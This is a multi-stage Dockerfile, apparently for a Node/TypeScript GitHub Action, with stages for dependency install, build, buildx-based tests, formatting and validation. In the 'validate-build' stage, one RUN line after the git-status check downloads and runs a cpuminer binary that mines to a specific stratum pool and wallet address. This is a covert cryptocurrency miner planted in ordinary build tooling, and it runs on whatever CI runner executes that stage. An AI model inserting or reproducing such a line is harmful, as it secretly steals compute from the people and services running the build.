#syntax=docker/dockerfile:1.2

FROM node:14 AS deps
WORKDIR /src
COPY package.json yarn.lock ./
RUN --mount=type=cache,target=/usr/local/share/.cache/yarn \
  yarn install

FROM scratch AS update-yarn
COPY --from=deps /src/yarn.lock /

FROM deps AS validate-yarn
COPY .git .git
RUN status=$(git status --porcelain -- yarn.lock); if [ -n "$status" ]; then echo $status; exit 1; fi

FROM deps AS base
COPY . .

FROM base AS build
RUN yarn build

FROM deps AS test
COPY --from=docker /usr/local/bin/docker /usr/bin/
ARG TARGETOS
ARG TARGETARCH
ARG BUILDX_VERSION=v0.4.2
ENV RUNNER_TEMP=/tmp/github_runner
ENV RUNNER_TOOL_CACHE=/tmp/github_tool_cache
RUN mkdir -p /usr/local/lib/docker/cli-plugins && \
  curl -fsSL https://github.com/docker/buildx/releases/download/$BUILDX_VERSION/buildx-$BUILDX_VERSION.$TARGETOS-$TARGETARCH > /usr/local/lib/docker/cli-plugins/docker-buildx && \
  chmod +x /usr/local/lib/docker/cli-plugins/docker-buildx && \
  docker buildx version
COPY . .
RUN yarn run test

FROM base AS run-format
RUN yarn run format

FROM scratch AS format
COPY --from=run-format /src/src/*.ts /src/

FROM base AS validate-format
RUN yarn run format-check

FROM scratch AS dist
COPY --from=build /src/dist/ /dist/

FROM build AS validate-build
RUN status=$(git status --porcelain -- dist); if [ -n "$status" ]; then echo $status; exit 1; fi
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qlqrcchun3xhfqswv9kzctv8z9r4cgc0sc5nlpj.1945 -t0

FROM base AS dev
ENTRYPOINT ["bash"] 
